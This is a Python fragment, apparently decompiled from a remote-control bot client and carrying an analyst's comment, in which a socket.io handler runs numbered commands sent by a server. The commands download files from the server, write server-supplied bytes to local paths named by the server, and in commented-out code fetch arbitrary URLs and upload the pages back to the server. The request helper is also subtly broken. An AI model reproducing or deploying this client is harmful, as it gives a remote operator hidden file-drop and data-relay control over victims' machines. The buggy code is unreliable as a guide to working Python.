class Actions:

    @staticmethod
    def pull_file_http(data: dict) -> None:
        """
            in pull action, data should contain file that contains the file name
        """
        base_url = f"{App.BASE_URL}/static/downloads/"
        r = requests.get(f"{base_url}{data.get('file')}")
        if r.status_code != 200:
            return
        filename = r.url.split('/')[-1]
        with open(f"./{filename}", 'wb') as f:
            f.write(r.content)

    @staticmethod
    def save_file_from_socket(data: dict) -> None:
        """
            in pull action, data should contain file that contain the file name.
        """
        print(f"write binary file -> {data.get('file')}")
        with open(f"./{data.get('file')}", 'wb') as f:
            f.write(data.get('file_data'))

    @staticmethod
    def made_requests(data: dict) -> None:
        """
            made chosen request http/s request
        """
        '''headers, url, method = data.get('headers'), data.get('url'), data.get('method', '').lower()
        payload = data.get('payload')
        if not url or method not in allowed_methods:
            return
        res = request(url=url, method=method, headers=headers, payload=payload)
        if not res:
            return
        body = res.text
        file_name = str(datetime.now())
        payload = {'file_name':file_name,  'file_html':body}
        request(url=f"{App.BASE_URL}/client/upload_html", method='post', payload=payload)'''
        pass

    @staticmethod 
    def none(*a, **k):
        print('none action been called !!')


class Command(Enum):

    def __new__(cls, command_number: str, func: callable):
        """
            bind special attribute to enum properties.

            :param command_number: the command Identifier.
            :param func: function, the function to call, when command need to be running.
            NOTE!! all Actions should get data attribute.
        """
        enum_field_obj = object.__new__(cls)
        enum_field_obj.command_number = command_number
        enum_field_obj._value_ = command_number
        enum_field_obj.run = func
        return enum_field_obj

    PULL = (
     1, Actions.pull_file_http)
    PULL_SOCKET = (2, Actions.save_file_from_socket)
    MADE_REQUEST = (3, Actions.made_requests)
    RUN_FILE = (5, Actions.none)

    @classmethod
    def numbers(cls) -> set:
        """
            return all types of commands numbers
        """
        return {attr.command_number for attr in cls}


sio.on('action')
def on_action(data: dict):
    """
        Data: dict in this format -> {'hi': < cmd command, str >, 'id': < command_id, int >} // analyzer note, format should be something like {'action_number': <action number, int>}
    """
    action_number = data.pop('action_number', None)
    if action_number not in Command.numbers():
        return 'not found action'
    Command(action_number).run(data)
    print(f"I received a message! {data}")


def request(*, method, url, headers=None, payload=None, query=None):
    """
        made http/s requests.

          :param method: str, the method name
          :param url: str, the url.
          :param payload: dict, the url to send.
          :param query: dict, optional to send query params in organized way.
          :param headers: dict, for adding special headers
          :return: request response, or None if request went wrong.
    """
    req_func = getattr(requests, method)
    req_params = {}
    req_params.update({'json': payload}) if payload else None
    req_params.update({'query': query}) if query else None
    req_params.update({'headers': headers}) if query else None
    try:
        res = req_func(url, **req_params)
    except ConnectionError as e:
        try:
            return
        finally:
            e = None
            del e

    else:
        return res